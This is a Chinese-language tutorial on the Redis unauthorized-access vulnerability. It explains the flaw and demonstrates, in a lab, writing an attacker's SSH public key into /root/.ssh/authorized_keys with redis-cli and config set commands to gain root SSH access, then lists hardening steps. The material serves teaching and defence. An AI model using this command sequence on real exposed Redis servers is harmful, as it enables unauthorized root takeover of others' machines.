## 一. 应用介绍

　　Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、 Key-Value数据库。和Memcached类似，它支持存储的value 类型相对更多，包括 string\(字符串\)、list \( 链表\)、 set\(集合\)、zset\(sorted set – 有序集合\)和 hash（哈希类型）。这些数据类型都支持push/pop 、 add/remove 及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上， redis支持各种不同方式的排序。与 memcached 一样，为了保证效率，数据都是缓存在内存中。区别的是 redis 会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了 master-slave \( 主从\)同步。

---

## 二. 漏洞介绍

　　Redis在默认情况下，会绑定在`0.0.0.0:6379`。如果没有采取相关的安全策略，比如添加防火墙规则、避免其他非信任来源IP访问等，这样会使Redis服务完全暴露在公网上。如果在没有设置密码认证\(一般为空\)的情况下，会导致任意用户在访问目标服务器时，可以在未授权的情况下访问Redis以及读取Redis的数据。攻击者在未授权访问Redis的情况下，利用Redis自身的提供的**config**命令，可以进行文件的读写等操作。攻击者可以成功地将自己的ssh公钥写入到目标服务器的`/root/.ssh`文件夹下的`authotrized_keys`文件中，进而可以使用对应地私钥直接使用ssh服务登录目标服务器。

简单来讲，我们可以将漏洞的产生归结为两点:

> * **redis绑定在`0.0.0.0:6379`，且没有进行添加防火墙规则、避免其他非信任来源IP访问等相关安全策略，直接暴露在公网上**
>
> * **没有设置密码认证\(一般为空\)，可以免密码远程登录redis服务**

![](/assets/redis-1.png)

漏洞可能产生的危害:

> * 攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以通过恶意执行`flushall`来清空所有数据
>
> * 攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件
>
> * 如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害者服务器



---

## 三. Redis未授权访问漏洞的利用

#### **安装redis**

```
wget http://download.redis.io/releases/redis-4.0.0.tar.gz

tar -zxvf redis-4.0.0.tar.gz

yum install gcc -y

cd redis-4.0.0

make MALLOC=libc

cd src && make install


```

#### 启动redis

```
./redis-server

使用配置文件启动

redis-server ../redis.conf
```

![](/assets/redis-2.png)

去掉ip绑定，允许除本地外的主机远程登录redis服务:

![](/assets/redis-3.png)

关闭保护模式，允许远程连接redis服务:

![](/assets/redis-4.png)



这里攻击方为attackA，服务器为serverB

把attackA的ssh公钥保存

```
(echo -e "\n\n";cat id_rsa.pub; echo -e "\n\n") > key.txt
```

将kitty.txt写入redis\(使用redis-cli -h IP命令连接主机A，将文件写入\)

```
root@kali:~/.ssh# cat key.txt | redis-cli -h 10.100.50.75 -x set xxx
OK
```

10.100.50.75为serverB的ip

**从attackA远程登录serverB的redis服务:`redis-cli -h 10.100.50.75`并使用`config get dir`命令得到redis备份的路径**

![](/assets/redis-5.png)

更改redis备份路径为ssh公钥存放目录\(一般默认为/root/.ssh）

```
config set dir /root/.ssh
```

设置上传公钥的备份文件名字为authorized\_keys

```
config set dbfilename authorized_keys
```

![](/assets/redis-7.png)

在attackA上使用ssh登录serverB

```
ssh root@10.100.50.75

```

---

## 四. Redis未授权访问漏洞的防护

#### 禁止远程使用一些高危命令 {#autoid-1-3-0}

我们可以通过修改redis.conf文件来禁用远程修改DB文件地址

```
rename-command FLUSHALL ""
rename-command CONFIG   ""
rename-command EVAL     ""
```

#### 低权限运行Redis服务 {#autoid-1-3-0}

为Redis服务创建单独的`user`和`home`目录，并且配置禁止登陆

```
groupadd -r redis && useradd -r -g redis redis
```

#### 为Redis添加密码验证 {#autoid-1-3-0}

我们可以通过修改redis.conf文件来为Redis添加密码验证

```
requirepass mypassword
```

#### 禁止外网访问 Redis {#autoid-1-3-0}

我们可以通过修改redis.conf文件来使得Redis服务只在当前主机可用

```
bind 127.0.0.1(绑定需要调用redis的远程ip地址)

bind 192.168.1.100 10.0.0.1(也可绑定多个ip)
```

#### 保证authorized\_keys文件的安全 {#autoid-1-3-0}

为了保证安全，您应该阻止其他用户添加新的公钥。将`authorized_keys`的权限设置为对拥有者只读，其他用户没有任何权限

```
chmod 400 ~/.ssh/authorized_keys
```

为保证`authorized_keys`的权限不会被改掉，您还需要设置该文件的immutable位权限

```
chattr +i ~/.ssh/authorized_keys
```

然而，用户还可以重命名`~/.ssh`，然后新建新的`~/.ssh`目录和`authorized_keys`文件。要避免这种情况，需要设置`~./ssh`的immutable位权限

```
chattr +i ~/.ssh
```

如果需要添加新的公钥，需要移除`authorized_keys`的 immutable 位权限。然后，添加好新的公钥之后，按照上述步骤重新加上immutable位权限

